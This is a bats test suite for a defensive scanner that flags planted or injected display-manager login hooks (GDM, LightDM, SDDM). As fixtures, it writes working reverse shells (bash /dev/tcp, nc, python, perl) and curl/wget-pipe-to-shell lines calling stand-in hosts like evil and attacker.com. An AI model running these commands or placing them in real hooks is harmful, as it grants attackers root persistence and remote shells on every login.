#!/usr/bin/env bats
# L2 bats functional tests for the display-manager-hooks-watchdog scan script.
#
# Display managers run their hook scripts (GDM PostLogin/PreSession, LightDM
# greeter/session-setup, SDDM scripts, …) AS ROOT around graphical login — a
# login-triggered root-exec surface. A planted hook that is world-writable /
# non-root-owned, or contains a command-injection pattern, is alert (T1546).
#
# Run with: bats packaging/test/L2-display-manager-hooks-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/display-manager-hooks-watchdog/systemd/display-manager-hooks-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    HOOKD="${TMP}/PostLogin"; mkdir -p "${HOOKD}"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_DMHOOK_PROFILE="${PROFILE:-report}" \
    SELFDEF_DMHOOK_BASELINE="${BASELINE}" \
    SELFDEF_DMHOOK_DIRS="${DIRS_V:-$HOOKD}" \
    SELFDEF_DMHOOK_FILES="${TMP}/no-extra-file" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

seed_benign() {
    printf '#!/bin/sh\n# Default\nexit 0\n' > "${HOOKD}/Default"
}

@test "no display-manager hooks → ok / no_dm_hooks" {
    DIRS_V="${TMP}/empty" run_wd
    cap | grep -q '"event":"no_dm_hooks"'
    cap | grep -q '"severity":"ok"'
}

@test "benign hook, first run → ok / baseline_initial" {
    seed_benign
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged hooks on second run → ok / dm_hooks_intact" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"dm_hooks_intact"'
    cap | grep -q '"severity":"ok"'
}

@test "a hook with an injection pattern → alert / dm_hooks_suspicious" {
    seed_benign
    run_wd
    printf '#!/bin/sh\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n' > "${HOOKD}/Default"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"dm_hooks_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "a world-writable hook → alert" {
    seed_benign
    run_wd
    chmod 0666 "${HOOKD}/Default"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a benign hook change → warn / dm_hooks_changed" {
    seed_benign
    run_wd
    printf '#!/bin/sh\n# Default updated\ntrue\n' > "${HOOKD}/Default"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"event":"dm_hooks_changed"'
    cap | grep -q '"severity":"warn"'
}

@test "a benign root-owned hook is NOT flagged" {
    seed_benign
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    seed_benign
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious hook" {
    seed_benign
    run_wd
    printf '#!/bin/sh\ncurl http://evil/p|sh\n' > "${HOOKD}/Default"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "baseline is chmod 0600 (confidentiality — DM hook inventory enumerates root-exec-on-graphical-login surface)" {
    seed_benign
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (reverse-shell pattern): /dev/tcp reverse shell in DM hook → alert" {
    seed_benign
    run_wd
    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HOOKD}/Default"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (wget-pipe-sh): wget bootstrap variant in DM hook → alert" {
    seed_benign
    run_wd
    printf '#!/bin/sh\nwget -qO- http://attacker/p | sh\n' > "${HOOKD}/Default"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (base64-decode-pipe): obfuscation variant in DM hook → alert" {
    seed_benign
    run_wd
    printf '#!/bin/sh\necho YmFzaCAtaQ== | base64 -d | bash\n' > "${HOOKD}/Default"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (group-writable hook): group-writable → alert above world-writable bar" {
    seed_benign
    run_wd
    chmod 0664 "${HOOKD}/Default"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (pre-existing world-writable hook): baseline_initial fires alert at install-time" {
    seed_benign
    chmod 0666 "${HOOKD}/Default"
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "DELTA detect — ADDED hook (attacker drops a new DM hook) surfaces in sample" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\necho "new"\n' > "${HOOKD}/distinctive-attacker-hook"
    run_wd
    cap | grep -q 'distinctive-attacker-hook'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    seed_benign
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-dm-hooks -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no auto-trust): display-manager-hooks-watchdog does NOT refresh baseline on injection detection — alert STAYS until operator updates" {
    # T1546 graphical-login-triggered root exec persistence — injection
    # alert MUST persist across runs until operator explicitly re-baselines.
    seed_benign
    run_wd
    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HOOKD}/Default"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"event":"dm_hooks_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (commented injection pattern NOT flagged: # prefix filtered)" {
    # DM hook scripts are /bin/sh; # comments. Operator notes
    # about hypothetical attack patterns must NOT trigger alert.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\n# Default\n# example attack: bash -i >& /dev/tcp/evil.com/4444 0>&1\nexit 0\n' > "${HOOKD}/Default"
    run_wd
    ! cap | grep -q '"event":"dm_hooks_suspicious"'
    ! cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (multi-DM-dir scan: GDM + LightDM + SDDM dir axes — injection in ANY → alert)" {
    # DMs source hooks from multiple dirs:
    #   GDM: /etc/gdm/PostLogin /etc/gdm/PreSession
    #   LightDM: /etc/lightdm/lightdm.conf.d /usr/share/lightdm/lightdm.conf.d
    #   SDDM: /usr/share/sddm/scripts /etc/sddm
    # Attacker may plant in any. Lock multi-dir axis.
    HOOKD2="${TMP}/PreSession"; mkdir -p "${HOOKD2}"
    seed_benign
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_DMHOOK_PROFILE="report" \
    SELFDEF_DMHOOK_BASELINE="${BASELINE}" \
    SELFDEF_DMHOOK_DIRS="${HOOKD} ${HOOKD2}" \
    SELFDEF_DMHOOK_FILES="${TMP}/no-extra-file" \
    bash "${WD}"
    : > "${SELFDEF_TEST_LOGCAP}"
    # Plant injection in PreSession dir.
    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HOOKD2}/evil-presession"
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_DMHOOK_PROFILE="report" \
    SELFDEF_DMHOOK_BASELINE="${BASELINE}" \
    SELFDEF_DMHOOK_DIRS="${HOOKD} ${HOOKD2}" \
    SELFDEF_DMHOOK_FILES="${TMP}/no-extra-file" \
    bash "${WD}"
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected)" {
    # curl | bash is a common bootstrap variant. Lock detection of
    # the bash suffix in addition to sh.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\ncurl -s http://attacker.com/p | bash\n' > "${HOOKD}/Default"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (nc reverse-shell variant in DM hook: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
    # Sister to sshrc/csh-config/logrotate/systemd-power-hooks/
    # bash-completion/anacrontab/apt-hooks/boot-script/ca-certificates/
    # dhcpcd-hooks nc reverse-shell variant INVARIANTs across the
    # brain. Lock the netcat axis on graphical-login-triggered root-
    # exec persistence surface (T1546 — GDM PostLogin/PreSession,
    # LightDM greeter/session-setup, SDDM scripts all run AS ROOT
    # around graphical login).
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\nnc -e /bin/sh 1.1.1.1 4444\n' > "${HOOKD}/Default"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (DELTA detect — ADDED display-manager hook surfaces in sample)" {
    # Sister to many other watchdog DELTA-detect sample-naming
    # INVARIANTs across the brain. When an attacker drops a new
    # display-manager hook (rather than modifying an existing one),
    # the added hook MUST surface in the JSON sample so operator
    # dashboard routes triage to the right path. Locks the new-
    # file-discovered operator-visibility contract on the
    # graphical-login-triggered root-exec surface.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\necho "new"\n' > "${HOOKD}/distinctive-attacker-dm-hook"
    chmod 0755 "${HOOKD}/distinctive-attacker-dm-hook"
    run_wd
    cap | grep -q 'distinctive-attacker-dm-hook'
}

@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on display-manager hook surface)" {
    # Sister to many other watchdog's python interpreter-rev-shell
    # INVARIANTs across the brain. Beyond bash/sh/nc, attackers
    # reach for python -c 'import socket,os,pty' to dodge shell-
    # pattern detectors. Locks the python axis on the graphical-
    # login-triggered root-exec persistence surface (T1546.004 —
    # display-manager hooks (gdm/lightdm/sddm /etc/X11/...) run AS
    # ROOT around every graphical login session).
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\npython -c "import socket,os,pty;s=socket.socket();s.connect((\\"1.1.1.1\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn(\\"/bin/sh\\")"\n' > "${HOOKD}/Xsession"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (perl -e reverse-shell variant — perl-interpreter-rev-shell axis on display-manager hook surface)" {
    # Sister to nc / python -c / curl|bash / dev-tcp display-
    # manager-hook rev-shell variants already locked. Perl is on
    # every Debian/Ubuntu host as dpkg/locale dependency; 'use
    # Socket' produces a one-liner connect-back PTY just as
    # cleanly as Python. Locks the perl axis on the T1546.004
    # graphical-login-triggered root-exec persistence surface —
    # display-manager hooks fire AS ROOT around every graphical
    # login; planted perl rev-shell fires every login until
    # detected.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\nperl -e "use Socket;\\$i=\\"1.1.1.1\\";\\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\"tcp\\"));connect(S,sockaddr_in(\\$p,inet_aton(\\$i)));exec(\\"/bin/sh -i\\");"\n' > "${HOOKD}/Xsession"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (single MAIN logger record per scan — SDD-062 consumer dispatch contract)" {
    # Sister to brain-wide single-MAIN-logger-line INVARIANTs.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HOOKD}/Xsession"
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-dm-hooks -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (exec-path under writable-root: DM hook invoking binary from /tmp → alert)" {
    # Sister to brain-wide writable-root-exec INVARIANTs. T1546
    # display-manager session-trigger root-exec / user-exec —
    # DM hooks fire on every graphical login session start.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\n/tmp/staged_payload\n' > "${HOOKD}/Xsession"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (severity bounded vocabulary {ok,warn,alert} — operator dashboard parser contract on display-manager-hooks surface)" {
    # Sister to brain-wide severity-bounded-vocabulary INVARIANTs.
    # The display-manager-hooks-watchdog MUST only emit severity
    # values from the closed set {ok,warn,alert} — never custom
    # values (critical, error, fatal, notice, info). Operator
    # dashboard parsers branch on the literal severity string;
    # an out-of-set value silently falls through routing and
    # the operator never sees the T1546 display-manager session-
    # trigger root-exec persistence alert. Locks parser
    # contract on the GDM/LightDM/SDDM hook detection surface.
    seed_benign
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # ok / baseline
    printf '#!/bin/sh\n/dev/tcp/1.1.1.1/4444\n' > "${HOOKD}/Xsession"
    run_wd                                              # alert path
    bad=$(grep -oE '"severity":"[^"]+"' "${SELFDEF_TEST_LOGCAP}" | grep -vE '"severity":"(ok|warn|alert)"' || true)
    [ -z "${bad}" ]
}

@test "INVARIANT (service unit declares Type=oneshot — timer-driven probe semantics)" {
    # Sister to brain-wide systemd Type=oneshot INVARIANT family.
    # display-manager-hooks-watchdog runs ON the timer's scheduled
    # fire — scans gdm/lightdm/sddm session/login hook dirs for
    # injection patterns, emits a verdict, then exits. Type=simple
    # would break timer OnUnitActiveSec semantics. Locks oneshot-
    # probe contract on the display-manager-hooks-watchdog
    # substrate.
    svc="${BATS_TEST_DIRNAME}/../../modules/display-manager-hooks-watchdog/systemd/selfdef-dm-hooks.service"
    [ -f "${svc}" ]
    grep -qE '^Type=oneshot' "${svc}"
}

@test "INVARIANT (module.toml TOML-parseable — anti-malformed-manifest contract)" {
    # Sister to brain-wide module.toml TOML-parseable INVARIANT
    # family. display-manager-hooks-watchdog manifest declares install + profile gating
    # the resolver enforces; malformed manifest wedges the
    # display-manager-hooks-watchdog scanner baseline. Python's tomllib is the
    # canonical parser. Locks anti-malformed-manifest on the
    # display-manager-hooks-watchdog substrate.
    mtoml="${BATS_TEST_DIRNAME}/../../modules/display-manager-hooks-watchdog/module.toml"
    [ -f "${mtoml}" ]
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
assert data['name'] == 'display-manager-hooks-watchdog', 'name mismatch'
assert 'version' in data, 'version missing'
assert 'install' in data, 'install missing'
"
}

@test "INVARIANT (no auto-fix: display-manager-hooks-watchdog libexec NEVER writes back to its scanned target — surveillance not remediation)" {
    # Sister to brain-wide no-auto-{fix,delete,restore,uninstall}
    # family. display-manager-hooks-watchdog is a DETECT-only watchdog: surveils its
    # target + emits verdicts, NEVER writes back. The libexec
    # script must NOT contain sed -i / tee mutations of its
    # scanned paths. Locks no-auto-fix on the display-manager-hooks-watchdog
    # libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/display-manager-hooks-watchdog/systemd"
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        ! grep -vE '^[[:space:]]*#' "${sh}" | grep -qE 'sed[[:space:]]+-i.*\$\{?[A-Z_]*FILE'
        ! grep -vE '^[[:space:]]*#' "${sh}" | grep -qE 'tee[[:space:]].*\$\{?[A-Z_]*FILE'
    done
}

@test "INVARIANT (display-manager-hooks-watchdog libexec uses set -u — anti-unbound-variable contract on the watchdog probe)" {
    # Sister to brain-wide shell-discipline INVARIANT family.
    # The display-manager-hooks-watchdog libexec uses set -u to catch typo'd env-var
    # references before they silently propagate as empty
    # strings into baseline-path operations. Locks set -u
    # discipline on the display-manager-hooks-watchdog libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/display-manager-hooks-watchdog/systemd"
    found=0
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        if grep -qE '^set[[:space:]]+-u' "${sh}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}
